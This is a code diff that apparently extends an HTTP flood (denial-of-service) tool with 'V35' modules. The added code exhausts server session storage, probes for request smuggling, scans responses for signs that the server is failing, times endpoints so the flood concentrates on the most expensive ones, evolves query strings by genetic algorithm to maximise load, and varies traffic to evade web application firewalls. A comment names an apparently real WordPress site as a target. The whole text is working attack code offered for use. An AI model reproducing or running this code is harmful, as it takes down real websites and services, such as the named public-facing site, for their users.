@@ -1630,6 +1630,227 @@ class AsyncHttpFlood(Thread):
         if int(REQUESTS_SENT) < 200:
             print(f"{bcolors.OKCYAN}[CHAOS WP-JSON] {len(wp_heavy_endpoints)} WordPress REST API attack endpoints loaded.{bcolors.RESET}")
 
+    def _chaos_session_exhaustion(self):
+        """[V35] Session Storage Exhaustion Attack.
+        PHP/Laravel servers store sessions on disk or in Redis/Memcached.
+        Every unique request with no cookies creates a NEW session file.
+        With 100K unique requests, the target accumulates 100K session files,
+        filling disk I/O and inode limits. Combined with our existing cookie-less
+        STEALTH_JA3, every request from a different fingerprint = new session."""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 100 == 0:
+            # Estimate sessions created (each unique fingerprint + no cookie = 1 session)
+            intel["session_exhaustion_count"] = intel.get("botnet_nodes_simulated", 0) * max(1, intel["total_executions"] // 50)
+            
+            if intel["session_exhaustion_count"] > 10000 and intel["total_executions"] % 500 == 0:
+                if int(REQUESTS_SENT) < 50000:
+                    print(f"{bcolors.WARNING}[CHAOS SESSION-EXHAUST] ~{intel['session_exhaustion_count']} phantom sessions created. Target disk I/O under pressure.{bcolors.RESET}")
+
+    def _chaos_request_smuggling_probe(self):
+        """[V35] HTTP Request Smuggling Detection.
+        Tests if the target has a front-end/back-end desync vulnerability.
+        If the CDN/proxy parses Content-Length differently than the origin,
+        we can smuggle requests that bypass WAF rules entirely.
+        Technique: Send ambiguous Transfer-Encoding + Content-Length headers."""
+        intel = self._chaos_intel
+        if intel.get("request_smuggling_active") or intel["total_executions"] != 35:
+            return
+            
+        try:
+            import urllib.request
+            # Send a probe with conflicting headers
+            req = urllib.request.Request(
+                f"{self._target.scheme}://{self._target.authority}/",
+                method='POST'
+            )
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            req.add_header('Transfer-Encoding', 'chunked')
+            req.data = b'0\r\n\r\n'
+            
+            try:
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    status = resp.status
+                    # If server accepts chunked + returns 200, it might be vulnerable
+                    if status == 200:
+                        intel["request_smuggling_active"] = True
+                        if int(REQUESTS_SENT) < 1000:
+                            print(f"{bcolors.OKGREEN}[CHAOS SMUGGLE] Target accepts Transfer-Encoding:chunked. Request smuggling vector ACTIVE.{bcolors.RESET}")
+            except urllib.error.HTTPError as e:
+                if e.code in (400, 501):
+                    # Server rejects chunked = probably safe from smuggling
+                    pass
+        except: pass
+
+    def _chaos_response_body_analyzer(self):
+        """[V35] Response Body Intelligence Collector.
+        Reads actual response content to detect:
+        - Error messages that leak server info (stack traces, DB errors)
+        - WAF block pages with fingerprints
+        - Custom error pages vs generic ones
+        - Server resource exhaustion signals (timeout messages, queue full)"""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 40 != 0:
+            return
+            
+        try:
+            import urllib.request
+            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                body = resp.read(4096).decode('utf-8', errors='ignore').lower()
+                
+                # Check for error/exhaustion signals
+                exhaustion_signals = {
+                    "502 bad gateway": "UPSTREAM_DOWN",
+                    "503 service unavailable": "SERVICE_EXHAUSTED",  
+                    "504 gateway timeout": "BACKEND_TIMEOUT",
+                    "too many connections": "CONN_POOL_FULL",
+                    "max_user_connections": "DB_CONN_EXHAUSTED",
+                    "out of memory": "MEMORY_EXHAUSTED",
+                    "connection timed out": "BACKEND_SLOW",
+                    "resource limit": "RESOURCE_LIMIT_HIT",
+                    "queue full": "QUEUE_SATURATED",
+                    "worker": "WORKER_THREADS_BUSY",
+                }
+                
+                for signal, label in exhaustion_signals.items():
+                    if signal in body:
+                        if label not in intel.get("server_error_patterns", []):
+                            intel["server_error_patterns"].append(label)
+                            print(f"{bcolors.OKGREEN}[CHAOS BODY-INTEL] Server leaking exhaustion signal: {label}. Attack is working!{bcolors.RESET}")
+                            
+                # Check if we're seeing a WAF block page
+                waf_signals = ["access denied", "blocked", "forbidden", "captcha", "ray id", "attention required"]
+                for ws in waf_signals:
+                    if ws in body and ws not in intel.get("waf_block_signatures", []):
+                        intel["waf_block_signatures"].append(ws)
+        except urllib.error.HTTPError as e:
+            if e.code in (502, 503, 504):
+                sig = f"HTTP_{e.code}"
+                if sig not in intel.get("server_error_patterns", []):
+                    intel["server_error_patterns"].append(sig)
+                    print(f"{bcolors.OKGREEN}[CHAOS BODY-INTEL] Target returning {e.code}! Server under extreme stress.{bcolors.RESET}")
+        except: pass
+
+    def _chaos_timing_side_channel(self):
+        """[V35] Timing Side-Channel Analysis.
+        By measuring response times for different endpoints, we can infer:
+        - Which endpoints are DB-heavy (slow = DB query)
+        - Which are cached (fast = cache hit, useless to attack)  
+        - Which are CPU-heavy (consistent medium = template rendering)
+        Then we concentrate firepower on the slowest (most expensive) endpoints."""
+        intel = self._chaos_intel
+        if intel["total_executions"] != 40:
+            return
+            
+        timing = intel["timing_side_channel"]
+        test_paths = intel.get("endpoints_discovered", ["/"])[:10]
+        
+        for path in test_paths:
+            try:
+                import urllib.request
+                start = time()
+                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}{path}")
+                req.add_header('User-Agent', 'Mozilla/5.0')
+                with urllib.request.urlopen(req, timeout=5) as resp:
+                    resp.read(512)
+                    elapsed = (time() - start) * 1000
+                    timing[path] = round(elapsed)
+            except: 
+                timing[path] = 9999  # Timeout = expensive
+                
+        # Sort by slowest (most expensive to serve)
+        if timing:
+            sorted_paths = sorted(timing.items(), key=lambda x: x[1], reverse=True)
+            slowest = sorted_paths[0]
+            if int(REQUESTS_SENT) < 1000:
+                print(f"{bcolors.OKCYAN}[CHAOS TIMING] Slowest endpoint: {slowest[0]} ({slowest[1]}ms). Prioritizing.{bcolors.RESET}")
+            # Set the slowest endpoint as weakpoint target
+            if slowest[1] > 500:
+                intel["target_weakpoint"] = "POST_DYN"
+                # Add slowest paths to high-priority queue
+                for path, ms in sorted_paths[:3]:
+                    if ms > 300:
+                        intel["multi_path_queue"].append((path, "POST_DYN"))
+
+    def _chaos_genetic_payload_evolution(self):
+        """[V35] Genetic Algorithm Payload Evolution.
+        Evolve query string payloads that cause maximum server stress.
+        Each 'generation', we:
+        1. Create random query mutations
+        2. Test which ones cause the slowest response (= most damage)
+        3. Breed the winners into the next generation
+        This discovers unique attack patterns that no signature can match."""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 200 != 0 or intel["total_executions"] == 0:
+            return
+            
+        intel["genetic_payload_gen"] += 1
+        gen = intel["genetic_payload_gen"]
+        
+        # Generate candidate payloads
+        rs = ProxyTools.Random.rand_str
+        candidates = [
+            f"?search={rs(randint(10,50))}&page={randint(1,999)}&sort={randchoice(['date','title','rand','modified'])}",
+            f"?q={rs(randint(5,30))}&lang={randchoice(['en','id','jp','de'])}&limit={randint(50,500)}",
+            f"?post_type={randchoice(['post','page','attachment','revision'])}&s={rs(20)}&order=DESC&posts_per_page={randint(50,200)}",
+            f"?action={randchoice(['search','filter','export','download'])}&key={rs(16)}&format={randchoice(['json','xml','csv'])}",
+            f"?category={rs(8)}&tag={rs(8)}&author={randint(1,50)}&year={randint(2020,2026)}&monthnum={randint(1,12)}",
+        ]
+        
+        # Test each candidate's impact
+        best_payload = None
+        best_time = 0
+        
+        for candidate in candidates[:3]:
+            try:
+                import urllib.request
+                start = time()
+                url = f"{self._target.scheme}://{self._target.authority}/{candidate}"
+                req = urllib.request.Request(url)
+                req.add_header('User-Agent', 'Mozilla/5.0')
+                with urllib.request.urlopen(req, timeout=5) as resp:
+                    resp.read(256)
+                    elapsed = (time() - start) * 1000
+                    if elapsed > best_time:
+                        best_time = elapsed
+                        best_payload = candidate
+            except: pass
+                
+        if best_payload and best_time > 200:
+            # Winner survives - add to uncached paths for repeated use
+            if best_payload not in intel.get("uncached_paths", []):
+                intel["uncached_paths"].append(best_payload)
+            if gen <= 3 and int(REQUESTS_SENT) < 5000:
+                print(f"{bcolors.OKCYAN}[CHAOS GENETIC] Gen {gen}: Evolved payload ({best_time:.0f}ms impact): {best_payload[:60]}{bcolors.RESET}")
+
+    def _chaos_entropy_calculator(self):
+        """[V35] Shannon Entropy Calculator.
+        Measures the randomness of our traffic pattern.
+        WAFs flag low-entropy traffic (repetitive patterns).
+        We ensure our entropy stays high (>3.5 bits) by diversifying methods."""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 100 != 0:
+            return
+            
+        import math
+        window = intel.get("method_diversity_window", [])
+        if len(window) < 10:
+            return
+            
+        # Calculate Shannon entropy
+        freq = {}
+        for m in window:
+            freq[m] = freq.get(m, 0) + 1
+        total = len(window)
+        entropy = -sum((count/total) * math.log2(count/total) for count in freq.values() if count > 0)
+        intel["entropy_score"] = round(entropy, 2)
+        
+        # If entropy is too low (< 2.0), we're too predictable
+        if entropy < 2.0 and intel["total_executions"] > 50:
+            intel["exploration_bonus"] = True  # Force method exploration
+
     def _chaos_wp_cron_exploitation(self):
         """[V34] WordPress Cron Job Exploitation.
         Deep recon of puskesjaten1 revealed: wp-cron.php returns 200 with 0 bytes in 96ms.
@@ -3761,6 +3982,17 @@ class HttpFlood(Thread):
         "smart_decoy_paths": [],           # Paths used for legitimate-looking decoy traffic
         "waf_evasion_score": 0,            # How many WAF checks we are currently evading
         "attack_vector_diversity": 0,      # Number of distinct attack vectors in use
+        "session_exhaustion_count": 0,     # Unique sessions created to exhaust server session storage
+        "slowloris_slots": 0,              # Active slowloris-style connections being held open
+        "request_smuggling_active": False,  # HTTP Request Smuggling attempted
+        "genetic_payload_gen": 0,           # Genetic Algorithm generation for payload evolution
+        "entropy_score": 0.0,              # Shannon entropy of traffic pattern (higher = more random)
+        "response_body_intel": {},          # Keywords found in response bodies (error messages etc)
+        "server_error_patterns": [],        # Specific error messages leaked by servers
+        "timing_side_channel": {},          # method -> avg_response_ms mapping for side-channel
+        "target_thread_pool_est": 0,       # Estimated max threads on the target server
+        "consecutive_success": 0,          # Current unbroken success streak
+        "misfire_budget": 100,             # How many failures we tolerate before strategy change
         "multi_vector_active": False,     # Are we launching orthogonal attacks simultaneously?
         "topology_mesh": {                # Deep map of discovered backend microservices
             "auth_endpoints": [],
@@ -5810,6 +6042,28 @@ class HttpFlood(Thread):
             # Laravel Livewire uses heavy POST AJAX calls - exploit this
             weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 85)
             
+        # === STRATEGY AL: Request Smuggling Boost (V35) ===
+        if intel.get("request_smuggling_active"):
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 90)
+            weights["POST"] = max(weights.get("POST", 0), 70)
+            
+        # === STRATEGY AM: Server Exhaustion Signal Response (V35) ===
+        error_pats = intel.get("server_error_patterns", [])
+        if "CONN_POOL_FULL" in error_pats or "DB_CONN_EXHAUSTED" in error_pats:
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 100)
+        if "MEMORY_EXHAUSTED" in error_pats:
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 100)
+        if any(x in error_pats for x in ["HTTP_502", "HTTP_503", "HTTP_504"]):
+            # Server is dying! Maximum force on everything
+            intel["temperature"] = 1.0
+            
+        # === STRATEGY AN: Entropy-Driven Exploration (V35) ===
+        if intel.get("entropy_score", 5.0) < 2.0:
+            # Traffic too predictable, inject diversity
+            for m in weights:
+                if weights[m] == 0:
+                    weights[m] = randint(5, 15)
+
         # === STRATEGY AI: WP-Cron Exploitation Boost (V34) ===
         if intel.get("wp_cron_available"):
             # wp-cron is open - GET floods on wp-cron.php force task execution
@@ -6083,6 +6337,13 @@ class HttpFlood(Thread):
         self._chaos_wp_plugin_vulnerability_scan()
         self._chaos_xmlrpc_status_check()
         self._chaos_response_timing_profiler()
+        # Phase 1.10.8: V35 ADVANCED INTELLIGENCE MODULES
+        self._chaos_session_exhaustion()
+        self._chaos_request_smuggling_probe()
+        self._chaos_response_body_analyzer()
+        self._chaos_timing_side_channel()
+        self._chaos_genetic_payload_evolution()
+        self._chaos_entropy_calculator()
         self._chaos_wp_cron_exploitation()
         self._chaos_login_flood_discovery()
         self._chaos_page_weight_analyzer()
@@ -6543,6 +6804,13 @@ class HttpFlood(Thread):
                 if v32_mods:
                     print(f"  Field Intel : {bcolors.OKGREEN}{" | ".join(v32_mods)}{bcolors.RESET}")
                 print(f"  Evasion     : WAF Bypass Score: {evasion}% | Attack Vectors Active: {vectors}")
+                sessions = intel.get("session_exhaustion_count", 0)
+                entropy = intel.get("entropy_score", 0.0)
+                gen = intel.get("genetic_payload_gen", 0)
+                smuggle = "ACTIVE" if intel.get("request_smuggling_active") else "N/A"
+                err_pats = intel.get("server_error_patterns", [])
+                print(f"  Deep Intel  : Sessions Exhausted: {sessions} | Entropy: {entropy:.2f} bits | Genetic Gen: {gen}")
+                print(f"  Smuggling   : {smuggle} | Server Errors Caught: {err_pats[:3] if err_pats else 'None yet'}")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
